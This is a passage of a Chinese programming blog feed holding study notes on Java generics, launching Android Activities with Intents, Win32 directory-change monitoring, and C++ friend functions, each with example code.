<h2 id="避免编译报错"><a href="#避免编译报错" class="headerlink" title="避免编译报错"></a>避免编译报错</h2><p>在我们使用容器的时候，由于ArrayList可以接受任何类型，所以导致我们有时会出现一些异常，下面是一个比较典型的例子：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.awt.List;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String agrs[])</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		ArrayList arrayList = <span class="keyword">new</span> ArrayList();</span><br><span class="line">		arrayList.add(<span class="string">"aaaa"</span>);</span><br><span class="line">		arrayList.add(<span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i&lt; arrayList.size();i++)&#123;</span><br><span class="line">		    String item = (String)arrayList.get(i);</span><br><span class="line">		    System.out.println(<span class="string">"泛型测试"</span>+<span class="string">"item = "</span> + item);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行的时候会出现如下异常：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Exception in thread <span class="string">"main"</span> java.lang.ClassCastException: java.lang.Integer cannot be cast to java.lang.String</span><br><span class="line">	at Test.main(Test.java:<span class="number">12</span>)</span><br></pre></td></tr></table></figure>
<p>意思就是说Int不能到String，这个时候就是在编译的时候不会报错，但是运行的时候确实会出现错误，那么我们如何更改比较好呢？<br>我们可以这样：<br><img src="img1.jpg" alt="编译报错"><br>这个样子就比较好处理了，这个就类似于：<code>static_cast</code>，比较安全。</p>
<h2 id="泛型类"><a href="#泛型类" class="headerlink" title="泛型类"></a>泛型类</h2><p>这个听名字就和模板很像了，其实感觉起来就是那么一回事，简单地说就是参数化，我们给他一个String，里面的内容就是跟String有关的，那么具体怎么实现呢？</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String agrs[])</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		ceshi&lt;String&gt; sCeshi = <span class="keyword">new</span> ceshi&lt;String&gt;();</span><br><span class="line">		ceshi&lt;Integer&gt; iCeshi = <span class="keyword">new</span> ceshi&lt;Integer&gt;();</span><br><span class="line">		sCeshi.SetKey(<span class="string">"123"</span>);</span><br><span class="line">		iCeshi.SetKey(<span class="number">123</span>);</span><br><span class="line">		System.out.println(sCeshi.GetKey());</span><br><span class="line">		System.out.println(iCeshi.GetKey());</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ceshi</span>&lt;<span class="title">W</span>&gt;</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> W key;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> W <span class="title">GetKey</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> key;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">SetKey</span><span class="params">(W key)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.key = key;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="img2.jpg" alt="正确示范"><br>注意！不能对确切的泛型类型使用<code>instanceof</code>操作。如下面的操作是非法的，编译时会出错。<br><code>instanceof</code>就是查看是什么类，主要用在多态。</p>
<h2 id="泛型接口"><a href="#泛型接口" class="headerlink" title="泛型接口"></a>泛型接口</h2><p>这个和上面类似，也就是定义的时候需要注意加上&lt;&gt;就可以了。<br><code>implements Test&lt;String&gt;</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Test</span>&lt;<span class="title">T</span>&gt; </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> T <span class="title">ceshi</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="泛型通配符"><a href="#泛型通配符" class="headerlink" title="泛型通配符"></a>泛型通配符</h2><p>这个东西主要是为了我们的方法做准备，有的时候需要传入一个泛型参数，但是什么填充类型呢？<br>我们可以用<code>?</code>进行填充，看下面示例代码就很容易明白了：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String agrs[])</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		ceshi&lt;String&gt; sCeshi = <span class="keyword">new</span> ceshi&lt;String&gt;();</span><br><span class="line">		ceshi&lt;Integer&gt; iCeshi = <span class="keyword">new</span> ceshi&lt;Integer&gt;();</span><br><span class="line">		sCeshi.SetKey(<span class="string">"123"</span>);</span><br><span class="line">		iCeshi.SetKey(<span class="number">123</span>);</span><br><span class="line">		Print(sCeshi);</span><br><span class="line">		Print(iCeshi);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Print</span><span class="params">(ceshi&lt;?&gt; T)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		System.out.println(T.GetKey());</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ceshi</span>&lt;<span class="title">W</span>&gt;</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> W key;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> W <span class="title">GetKey</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> key;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">SetKey</span><span class="params">(W key)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.key = key;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先写这么多吧，下篇文章继续写！！！</p>
]]></content>
      <categories>
        <category>Android学习</category>
      </categories>
      <tags>
        <tag>Android学习</tag>
      </tags>
  </entry>
  <entry>
    <title>Intent Open Activity2</title>
    <url>/2020/01/21/Intent-Open-Activity2/</url>
    <content><![CDATA[<h1 id="Intent打开Activity的其他显示调用"><a href="#Intent打开Activity的其他显示调用" class="headerlink" title="Intent打开Activity的其他显示调用"></a>Intent打开Activity的其他显示调用</h1><p>一. 通过全类名</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Intent inten1 = <span class="keyword">new</span> Intent();</span><br><span class="line">inten1.setClassName(<span class="keyword">this</span>, <span class="string">"com.example.lx.activity"</span>);</span><br><span class="line">startActivity(inten1);</span><br></pre></td></tr></table></figure>
<p>二.通过包名和全类名</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Intent inten2 = <span class="keyword">new</span> Intent();</span><br><span class="line">inten2.setClassName(<span class="string">"com.example.test"</span>, <span class="string">"com.example.test.st"</span>);<span class="comment">//支持调用其他的应用程序</span></span><br><span class="line">startActivity(inten2);</span><br></pre></td></tr></table></figure>
<p>注意我的注释，可以打开其他的应用程序，意思就是远程打开另外APP的Activity，但在这我们需要注意，包名是包名，全类名要填写打开的Activity的全类名，但是有一点要注意，如果我们打开的是主界面那倒是无所谓，但是如果我们打开的不是主界面，那么我们就需要注意了，我们需要在配置我们的Activity属性的时候加上这么一句话：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">".st"</span> <span class="attr">android:exported</span>=<span class="string">"true"</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<p>可以看到有一个exported的属性，这个就是是否允许远程调用，默认是false。<br>三.通过Component</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Intent inten1 = <span class="keyword">new</span> Intent();</span><br><span class="line">inten1.setClassName(<span class="keyword">this</span>, <span class="string">"com.example.lx.activity"</span>);</span><br><span class="line">inten1.setComponent(<span class="keyword">new</span> ComponentName(<span class="keyword">this</span>,activity<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">startActivity(inten1);</span><br></pre></td></tr></table></figure>
<p>new一个就可以了</p>
<h2 id="安卓Listener"><a href="#安卓Listener" class="headerlink" title="安卓Listener"></a>安卓Listener</h2><p>一点小补充，我们如果偏要设置监听时候要用this，习惯win32的话呢我们需要将我们的类接上类似于：<code>OnClickListener</code>这个样子的一个借口，然后完成：<code>public void onClick(View v)</code>这个函数，<code>v.getId()</code>可以获得事件源，在R文件中的定义对比，建议还是用switch进行判断。</p>
]]></content>
      <categories>
        <category>Android学习</category>
      </categories>
      <tags>
        <tag>Android学习</tag>
      </tags>
  </entry>
  <entry>
    <title>Dir Monitor</title>
    <url>/2020/01/21/Dir-Monitor/</url>
    <content><![CDATA[<h1 id="目录监视功能"><a href="#目录监视功能" class="headerlink" title="目录监视功能"></a>目录监视功能</h1><p>这个实现的效果有很多办法，比如说Hook，但是这个的话呢相对而言有点小麻烦，但是灵活性比较好，但当我们要求比较低，只是想单纯的监视的时候（对更改的内容和文件名之类不感兴趣的时候），我们可以考虑<code>FindFirstChangeNotification</code>这个相关的函数。</p>
<h2 id="FindFirstChangeNotification"><a href="#FindFirstChangeNotification" class="headerlink" title="FindFirstChangeNotification"></a><code>FindFirstChangeNotification</code></h2><p>这个函数是队目录监控的一个函数，具体微软怎么实现的不知道（感觉应该也跟钩子有关系），这个函数调用比较简单，共有下面三个参数：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">FindFirstChangeNotification</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCTSTR lpPathName,    <span class="comment">// pointer to name of directory to watch</span></span></span></span><br><span class="line"><span class="function"><span class="params">  BOOL bWatchSubtree,    <span class="comment">// flag for monitoring directory or </span></span></span></span><br><span class="line"><span class="function"><span class="params">                         <span class="comment">// directory tree</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwNotifyFilter   <span class="comment">// filter conditions to watch for</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<ol>
<li>lpPathName：监视的目录文件夹</li>
<li>bWatchSubtree ：是否监视子目录</li>
<li>dwNotifyFilter：监视的类型</li>
</ol>
<ul>
<li>FILE_NOTIFY_CHANGE_FILE_NAME</li>
<li>FILE_NOTIFY_CHANGE_DIR_NAME</li>
<li>FILE_NOTIFY_CHANGE_ATTRIBUTES</li>
<li>FILE_NOTIFY_CHANGE_SIZE</li>
<li>FILE_NOTIFY_CHANGE_LAST_WRITE</li>
<li>FILE_NOTIFY_CHANGE_SECURITY<br>看名字就能看明白了。<br>返回值是一个句柄，这个句柄可以通过等待进行相应，这也就是下面我将要说到的一个函数。和这个相关的是：<code>FindNextChangeNotification</code>, <code>FindCloseChangeNotification</code>这个在最后提。<h2 id="WaitForMultipleObjects"><a href="#WaitForMultipleObjects" class="headerlink" title="WaitForMultipleObjects"></a><code>WaitForMultipleObjects</code></h2>这个函数有点类似于：<code>WaitForSingleObject</code>，但是这个我们是支持单个对象的，但对于多对象的我们就需要用到<code>WaitForMultipleObjects</code>，看下MSDN给出的定义：<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">WaitForMultipleObjects</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">	DWORD nCount,             <span class="comment">// number of handles in the handle array</span></span></span></span><br><span class="line"><span class="function"><span class="params">	CONST HANDLE *lpHandles,  <span class="comment">// pointer to the object-handle array</span></span></span></span><br><span class="line"><span class="function"><span class="params">	BOOL fWaitAll,            <span class="comment">// wait flag</span></span></span></span><br><span class="line"><span class="function"><span class="params">	DWORD dwMilliseconds      <span class="comment">// time-out interval in milliseconds);</span></span></span></span><br></pre></td></tr></table></figure></li>
</ul>
<ol>
<li>nCount：等待的个数</li>
<li>lpHandles：等待时间句柄的数组</li>
<li>fWaitAll：是否等待所有时间都相应</li>
<li>dwMilliseconds：等待的时间</li>
</ol>
<p>dwMilliseconds这个参数如果我们提供：INFINITE 这个的话呢将视为无线等待（一般就填写这个就比较好）。<br>返回值：<br>WAIT_OBJECT_0 to (WAIT_OBJECT_0 + nCount – 1)：If bWaitAll is TRUE, the return value indicates that the state of all specified objects is signaled.<br>If bWaitAll is FALSE, the return value minus WAIT_OBJECT_0 indicates the lpHandles array index of the object that satisfied the wait. If more than one object became signalled during the call, this is the array index of the signalled object with the smallest index value of all the signalled objects.</p>
<p>WAIT_ABANDONED_0 to (WAIT_ABANDONED_0 + nCount – 1)：If bWaitAll is TRUE, the return value indicates that the state of all specified objects is signaled and at least one of the objects is an abandoned mutex object.<br>If bWaitAll is FALSE, the return value minus WAIT_ABANDONED_0 indicates the lpHandles array index of an abandoned mutex object that satisfied the wait.</p>
<p>WAIT_TIMEOUT：The time-out interval elapsed and the conditions specified by the bWaitAll parameter are not satisfied. </p>
<p>是不是有点眼花缭乱，我翻译一下吧：</p>
<p>如果bWaitAll为真，则返回值表示所有指定对象的状态都有信号。如果bWaitAll为FALSE，则返回值减去WAIT_OBJECT_0表示满足等待的对象的lpHandles数组索引。如果在调用期间有多个对象被标记，这是标记对象的数组索引，索引值是所有标记对象的最小值。如果bWaitAll为真，则返回值表明所有指定对象的状态都有信号，并且至少有一个对象是废弃的互斥对象。如果bWaitAll为FALSE，则返回值减去wait_oned_0表示满足等待的废弃互斥对象的lpHandles数组索引。超时时间间隔和bWaitAll参数指定的条件不满足。</p>
<p>简单地说我们如果是无限等待返回给我们的值-WAIT_OBJECT_0就是我们提供的对象句柄的数组的下标值。</p>
<h2 id="测试代码："><a href="#测试代码：" class="headerlink" title="测试代码："></a>测试代码：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE m_charnge[<span class="number">3</span>];</span><br><span class="line">	m_charnge[<span class="number">0</span>]=FindFirstChangeNotification(<span class="string">"E:\\"</span>,TRUE,FILE_NOTIFY_CHANGE_FILE_NAME);</span><br><span class="line">	m_charnge[<span class="number">1</span>]=FindFirstChangeNotification(<span class="string">"E:\\"</span>,TRUE,FILE_NOTIFY_CHANGE_DIR_NAME);</span><br><span class="line">	m_charnge[<span class="number">2</span>]=FindFirstChangeNotification(<span class="string">"E:\\"</span>,TRUE,FILE_NOTIFY_CHANGE_LAST_WRITE);	</span><br><span class="line">	<span class="keyword">while</span>(<span class="literal">true</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		DWORD Rv = WaitForMultipleObjects(<span class="number">3</span>,m_charnge,FALSE,INFINITE);</span><br><span class="line">		<span class="keyword">switch</span>(Rv-WAIT_OBJECT_0)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">				<span class="built_in">cout</span>&lt;&lt;<span class="string">"文件名改變"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">				<span class="built_in">cout</span>&lt;&lt;<span class="string">"目錄改變"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">				<span class="built_in">cout</span>&lt;&lt;<span class="string">"內容改變"</span>&lt;&lt;<span class="built_in">endl</span>;			</span><br><span class="line">		&#125;</span><br><span class="line">		FindNextChangeNotification(m_charnge[Rv]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意的是在填写监视目录的时候别忘记转义，其他的都好说。</p>
]]></content>
      <categories>
        <category>Win32编程</category>
      </categories>
      <tags>
        <tag>Win32编程</tag>
      </tags>
  </entry>
  <entry>
    <title>C++ friend fun</title>
    <url>/2020/01/21/C-friend-fun/</url>
    <content><![CDATA[<h1 id="友元函数"><a href="#友元函数" class="headerlink" title="友元函数"></a>友元函数</h1><p>这种函数当时学的时候忘了，在这里重新回忆一下，这种函数的作用和他的名字一样，就是方便我们的使用，就是说你没有必要将这个函数放在你的类中，只需要在生命的时候给他前面加上一个friend，然后就在外部声明就好了，还有就是友元类，这个和友元函数类似。<br>简单的看下友元函数的写法：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">private</span>:</span><br><span class="line">		<span class="keyword">int</span> a;</span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">		<span class="function"><span class="keyword">int</span> <span class="title">Geta</span><span class="params">()</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			<span class="keyword">return</span> a;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="function"><span class="keyword">friend</span> <span class="keyword">void</span> <span class="title">FGA</span><span class="params">(Test&amp; i)</span></span>;<span class="comment">//友元函数的定义</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">FGA</span><span class="params">(Test&amp; i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	i.a = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Test *o = <span class="keyword">new</span> Test();</span><br><span class="line">	FGA(*o);</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;o-&gt;Geta()&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Win32编程</category>
      </categories>
      <tags>
        <tag>Win32编程</tag>
      </tags>
  </entry>
  <entry>
    <title>Intent Open Activity</title>
    <url>/2020/01/20/Intent-Open-Activity/</url>
    <content><![CDATA[<h1 id="通过Intent打开Activity"><a href="#通过Intent打开Activity" class="headerlink" title="通过Intent打开Activity"></a>通过Intent打开Activity</h1><h2 id="Intent"><a href="#Intent" class="headerlink" title="Intent"></a>Intent</h2><p>官方解释：<br>[^Intent]:Intent（意图）主要是解决Android应用的各项组件之间的通讯。<br>Intent负责对应用中一次操作的动作、动作涉及数据、附加数据进行描述，Android则根据此Intent的描述，负责找到对应的组件，将 Intent传递给被调用的组件，并完成组件的调用。<br>因此，Intent在这里起着一个媒体中介的作用，专门提供组件互相调用的相关信息，实现调用者与被调用者之间的解耦。</p>
<p>简单的说，这个东西通俗的将其实就是一个媒介，通过在他里面放东西，然后做一些事情（目前我的层面是这么理解）。</p>
<h2 id="Activity"><a href="#Activity" class="headerlink" title="Activity"></a>Activity</h2><p>这个东西就类似是一个界面，用于和用户进行界面交互。</p>
<h2 id="通过Intent打开一个Activity"><a href="#通过Intent打开一个Activity" class="headerlink" title="通过Intent打开一个Activity"></a>通过Intent打开一个Activity</h2><p>我们经常会有这样子的需求，就是说我们需要在这个页面通过一个按钮打开另外的一个页面，那么我们就可以这个样子进行操作。<br>首先我们用eclipse创建一个安卓项目，自带一个Activity，然后我们编辑：res/layout下生成的xml文件，我们添加一个button，布局什么的这些测试的过程中不是很重要。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">	<span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/btn_OpenActivity"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_alignLeft</span>=<span class="string">"@+id/textView1"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_below</span>=<span class="string">"@+id/textView1"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"@string/Open"</span> /&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- PS：</span></span><br><span class="line"><span class="comment">第一句代码，是用来指定我们的button的ID为：btn_OpenActivity</span></span><br><span class="line"><span class="comment">第二三句代码：用来指定我们的button宽与高（wrap_content表示与文字同高宽）</span></span><br><span class="line"><span class="comment">四五句：layout_alignLeft：这个表示与给定ID同左边，五类似四</span></span><br><span class="line"><span class="comment">@string/Open：这个主要是在我们的res/values/strings.xml这个文件中有我们给定的常量值。</span></span><br><span class="line"><span class="comment"> --&gt;</span></span><br></pre></td></tr></table></figure>
<p>我们编辑完Activity.xml之后我们再添加一个布局，这个就是我们通过Intent打开的一个界面，编辑的话呢，也不是很重要，参考上面就好。</p>
<p><strong>然后我们在 AndroidManifest.xml 文件中的加上Activity一个节点：<code>&lt;activity android:name=&quot;.activity&quot;&gt;&lt;/activity&gt;</code>，这个就有点类似于声明一个Activity。</strong></p>
<p>编辑完之后我们新建一个类，这个类是我们的第二个界面，这个类要继承于Activity这个类，表明他是一个窗口，我们重载<code>onCreate</code>这个函数用来添加我们的上下文对象（注意这里与Win32有点类似，Win32称之为DC，但是我Java称之为Layout），具体代码如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.lx;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.app.Activity;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">activity</span> <span class="keyword">extends</span> <span class="title">Activity</span></span>&#123;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">		<span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">		setContentView(R.layout.activity_01);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">比较好理解，其实setContentView这个函数就是一个就是关联一个布局，这个布局的ID在我们gen/R.java这个文件中进行定义，final static定义的一个常量。</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<p>我们编辑完我们的Activity打开页面之后，我们来编辑我们的初始界面，这个界面我们使用下面的代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.lx;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.app.Activity;</span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.view.Menu;</span><br><span class="line"><span class="keyword">import</span> android.view.MenuItem;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.view.View.OnClickListener;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">Activity</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> Button btn_test;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">		setContentView(R.layout.activity_main);</span><br><span class="line">		btn_test = (Button) findViewById(R.id.btn_OpenActivity);</span><br><span class="line">		btn_test.setOnClickListener(<span class="keyword">new</span> OnClickListener() &#123;</span><br><span class="line">			</span><br><span class="line">			<span class="meta">@Override</span></span><br><span class="line">			<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">				Intent intent = <span class="keyword">new</span> Intent();</span><br><span class="line">				intent.setClass(MainActivity.<span class="keyword">this</span>, activity<span class="class">.<span class="keyword">class</span>)</span>;<span class="comment">//packageContext上下文</span></span><br><span class="line">				startActivity(intent);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;);</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onCreateOptionsMenu</span><span class="params">(Menu menu)</span> </span>&#123;</span><br><span class="line">		<span class="comment">// Inflate the menu; this adds items to the action bar if it is present.</span></span><br><span class="line">		getMenuInflater().inflate(R.menu.main, menu);</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onOptionsItemSelected</span><span class="params">(MenuItem item)</span> </span>&#123;</span><br><span class="line">		<span class="comment">// Handle action bar item clicks here. The action bar will</span></span><br><span class="line">		<span class="comment">// automatically handle clicks on the Home/Up button, so long</span></span><br><span class="line">		<span class="comment">// as you specify a parent activity in AndroidManifest.xml.</span></span><br><span class="line">		<span class="keyword">int</span> id = item.getItemId();</span><br><span class="line">		<span class="keyword">if</span> (id == R.id.action_settings) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">super</span>.onOptionsItemSelected(item);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>大部分不是太重要，关键的就是我们的看：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> Button btn_test;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">		setContentView(R.layout.activity_main);</span><br><span class="line">		btn_test = (Button) findViewById(R.id.btn_OpenActivity);</span><br><span class="line">		btn_test.setOnClickListener(<span class="keyword">new</span> OnClickListener() &#123;</span><br><span class="line">			</span><br><span class="line">			<span class="meta">@Override</span></span><br><span class="line">			<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">				Intent intent = <span class="keyword">new</span> Intent();</span><br><span class="line">				intent.setClass(MainActivity.<span class="keyword">this</span>, activity<span class="class">.<span class="keyword">class</span>)</span>;<span class="comment">//packageContext上下文</span></span><br><span class="line">				startActivity(intent);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;);</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>这一段代码使我们的关键，首先我定义了一个private权限的button，然后我们用<code>findviewById</code>这个函数进行关联，还是用到了R文件下的全局ID，然后进行了强制转换，关联之后我们设置一个监听器，new一个就好，不要用this那种方法，反正我不是很喜欢，那种写法让我想起了Win32繁杂的switch case语句，很烦的，题外话。然后我们在那个消息器中new一个Intent，然后将我们的Intent设置一下Class，setClass这个方法其实我也不是很明白，但是看样子就是讲我们的一个上下文对象关联到一个类上面，网上看了一下介绍：</p>
<ul>
